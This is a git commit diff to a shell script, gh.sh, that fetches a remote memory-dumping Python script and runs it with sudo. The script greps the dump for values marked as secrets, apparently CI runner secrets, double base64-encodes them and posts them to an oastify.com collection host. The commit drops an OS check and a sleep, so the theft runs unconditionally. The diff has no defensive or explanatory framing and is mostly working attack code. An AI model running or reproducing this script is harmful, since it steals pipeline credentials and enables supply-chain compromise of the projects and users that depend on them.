de3cb502f9d0cb1e8117f47d09831bb1a16c2736
Naor Yaacov <46160459+NaorYaa@users.noreply.github.com>
2024-01-11 15:07:21 +0200

    Update gh.sh

--- gh.sh
+++ gh.sh
@@ -1,10 +1,4 @@
 YOUR_EXFIL="https://bm1r0o9d3avrqu1hhmzb369unltkw8pwe.oastify.com" 
-
-if [[ "$OSTYPE" == "linux-gnu" ]]; then
-  B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
-  echo $B64_BLOB
-  curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/token > /dev/null
-  sleep 900
-else
-  exit 0
-fi
+B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
+echo $B64_BLOB
+curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/token > /dev/null
